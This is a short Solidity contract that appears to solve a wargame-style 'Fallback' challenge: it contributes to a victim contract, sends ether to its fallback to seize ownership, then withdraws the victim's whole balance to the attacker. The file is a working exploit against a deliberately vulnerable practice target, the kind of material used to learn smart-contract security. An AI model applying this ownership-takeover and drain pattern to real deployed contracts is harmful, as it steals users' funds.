// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Fallback} from "../victims/Fallback.sol";

contract AttackFallback {
    Fallback victim;
    address public owner;

    constructor(Fallback _victim) {
        victim = _victim;
        owner = msg.sender;
    }

    function attack(uint256 value) public payable {
        // 0xd7bb99ba
        victim.contribute{value: value}();

        (bool success, ) = address(victim).call{value: msg.value}("");

        require(success, "Attack failed");

        // 0x3ccfd60b
        victim.withdraw();
    }

    function withdraw() public {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}
